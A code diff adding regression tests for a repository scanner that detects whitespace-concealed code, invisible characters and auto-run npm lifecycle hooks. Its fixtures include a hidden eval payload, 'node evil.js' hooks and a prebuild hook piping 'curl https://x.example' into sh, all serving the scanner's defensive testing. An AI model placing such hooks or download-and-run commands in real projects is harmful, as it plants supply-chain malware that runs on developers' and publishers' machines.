@@ -192,6 +192,85 @@ describe('scope', () => {
   });
 });
 
+// Regression cover for the two allowlist holes found by the 2026-08-29
+// completeness-guard audit (docs/audits/2026-08-29-completeness-guard-audit.md
+// F1 and F2). Both were the same defect this gate exists to catch: the gate
+// enumerated what to CHECK instead of what to SKIP, so anything it had not
+// predicted was invisible.
+describe('scope is not an extension allowlist (audit F2)', () => {
+  const concealed = `echo ok${' '.repeat(60)}eval("x")${' # '}${'x'.repeat(80)}\n`;
+
+  test('scans a file with no extension at all', async () => {
+    // The live exposure was .husky/pre-push, which runs on every developer
+    // push. Under the old SCOPED_EXTENSIONS allowlist, inScope() required a
+    // dot, so an extensionless file was never opened.
+    await withTree({ 'scripts/pre-push': concealed }, ({ code, stderr }) => {
+      expect(code).toBe(1);
+      expect(stderr).toContain('pre-push');
+    });
+  });
+
+  test('scans an extension nobody thought to allowlist', async () => {
+    await withTree({ 'scripts/probe.rb': concealed }, ({ code }) => expect(code).toBe(1));
+  });
+
+  test('prose keeps the invisible-character rule', async () => {
+    // Relaxing prose must not relax it into a blind spot: a zero-width
+    // character in a README is never benign.
+    await withTree({ 'README.md': `Hello${ZWSP} world\n` }, ({ code, stderr }) => {
+      expect(code).toBe(1);
+      expect(stderr).toContain('U+200B');
+    });
+  });
+
+  test('prose is exempt from the code-shaped rules', async () => {
+    // A long paragraph in a CHANGELOG is a paragraph, and a doc that quotes
+    // eval() is documentation. Markdown is not executed.
+    await withTree({ 'CHANGELOG.md': `${'word '.repeat(200)}eval(x)\n` }, ({ code }) =>
+      expect(code).toBe(0)
+    );
+  });
+});
+
+describe('auto-fired lifecycle scripts (audit F1)', () => {
+  test('flags prepack, which runs during npm publish', async () => {
+    // The finding: prepack was absent from the old four-name FORBIDDEN_LIFECYCLE
+    // list, and npm runs it inside the publish job that holds id-token: write.
+    const pkg = JSON.stringify({ scripts: { prepack: 'node evil.js' } });
+    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
+      expect(code).toBe(1);
+      expect(stderr).toContain('prepack');
+    });
+  });
+
+  test.each(['postpack', 'dependencies', 'preversion', 'postpublish', 'preuninstall'])(
+    'flags %s',
+    async (hook) => {
+      const pkg = JSON.stringify({ scripts: { [hook]: 'node evil.js' } });
+      await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
+    }
+  );
+
+  test('flags a pre/post wrapper around an existing script', async () => {
+    // The general form: npm auto-runs preX/postX around any script X, so a
+    // wrapper fires implicitly even though its own name is not a lifecycle hook.
+    const pkg = JSON.stringify({
+      scripts: { build: 'tsc', prebuild: 'curl https://x.example | sh' },
+    });
+    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
+      expect(code).toBe(1);
+      expect(stderr).toContain('prebuild');
+    });
+  });
+
+  test('does not flag an explicitly-invoked script that shares a lifecycle name', async () => {
+    // `test` only runs when you type it. This repo defines it; refusing it
+    // would make the gate unusable, which is how allowlists get widened.
+    const pkg = JSON.stringify({ scripts: { test: 'bun test', build: 'tsc' } });
+    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(0));
+  });
+});
+
 describe('invisible characters', () => {
   test('flags a zero-width space', async () => {
     await withTree({ 'src/a.ts': `const a${ZWSP} = 1;\n` }, ({ code, stderr }) => {
